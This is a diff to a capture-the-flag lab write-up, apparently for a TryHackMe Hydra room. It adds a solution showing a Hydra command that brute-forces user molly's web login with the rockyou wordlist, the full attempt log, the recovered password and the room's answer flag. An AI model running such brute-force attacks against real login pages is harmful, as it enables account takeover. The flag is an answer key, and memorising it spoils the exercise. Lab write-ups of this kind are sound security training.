@@ -129,7 +129,74 @@ and brute force your credentials to the deployed machine!
 
 Use Hydra to bruteforce molly's web password. What is flag 1?
 
-***Correct answer:***
+*Solution:* We need to add `/login` at the beginning of the given command's path.
+
+```bash
+root@ip-10-81-137-139:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.81.164.8 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-29 06:55:25
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-post-form://10.81.164.8:80/login/:username=^USER^&password=^PASS^:F=incorrect
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "123456" - 1 of 14344398 [child 0] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "12345" - 2 of 14344398 [child 1] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "password" - 4 of 14344398 [child 3] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "iloveyou" - 5 of 14344398 [child 4] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "princess" - 6 of 14344398 [child 5] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "1234567" - 7 of 14344398 [child 6] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "rockyou" - 8 of 14344398 [child 7] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "12345678" - 9 of 14344398 [child 8] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "abc123" - 10 of 14344398 [child 9] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "nicole" - 11 of 14344398 [child 10] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "daniel" - 12 of 14344398 [child 11] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "babygirl" - 13 of 14344398 [child 12] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "monkey" - 14 of 14344398 [child 13] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "lovely" - 15 of 14344398 [child 14] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "jessica" - 16 of 14344398 [child 15] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "654321" - 17 of 14344398 [child 4] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "michael" - 18 of 14344398 [child 1] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "ashley" - 19 of 14344398 [child 3] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "qwerty" - 20 of 14344398 [child 0] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "111111" - 21 of 14344398 [child 2] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "iloveu" - 22 of 14344398 [child 5] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "000000" - 23 of 14344398 [child 6] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "michelle" - 24 of 14344398 [child 7] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "tigger" - 25 of 14344398 [child 13] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "sunshine" - 26 of 14344398 [child 8] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "chocolate" - 27 of 14344398 [child 10] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "password1" - 28 of 14344398 [child 11] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "soccer" - 29 of 14344398 [child 12] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "anthony" - 30 of 14344398 [child 14] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "friends" - 31 of 14344398 [child 9] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "butterfly" - 32 of 14344398 [child 15] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "purple" - 33 of 14344398 [child 4] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "angel" - 34 of 14344398 [child 1] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "jordan" - 35 of 14344398 [child 3] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "liverpool" - 36 of 14344398 [child 9] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "justin" - 37 of 14344398 [child 12] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "loveme" - 38 of 14344398 [child 15] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "fuckyou" - 39 of 14344398 [child 2] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "123123" - 40 of 14344398 [child 6] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "football" - 41 of 14344398 [child 7] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "secret" - 42 of 14344398 [child 13] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "andrea" - 43 of 14344398 [child 14] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "carlos" - 44 of 14344398 [child 0] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "jennifer" - 45 of 14344398 [child 5] (0/0)
+[ATTEMPT] target 10.81.164.8 - login "molly" - pass "joshua" - 46 of 14344398 [child 4] (0/0)
+[80][http-post-form] host: 10.81.164.8   login: molly   password: sunshine
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-29 06:55:39
+```
+
+The password is `sunshine`.
+Now open a browser and go to `http://10.81.164.8/login`.
+Enter `molly` and `sunshine`.
+
+![hydra-login](hydra-login.png)
+
+***Correct answer:THM{2673a7dd116de68e85c48ec0b1f2612e}***
 
 Use Hydra to bruteforce molly's SSH password. What is flag 2?
 
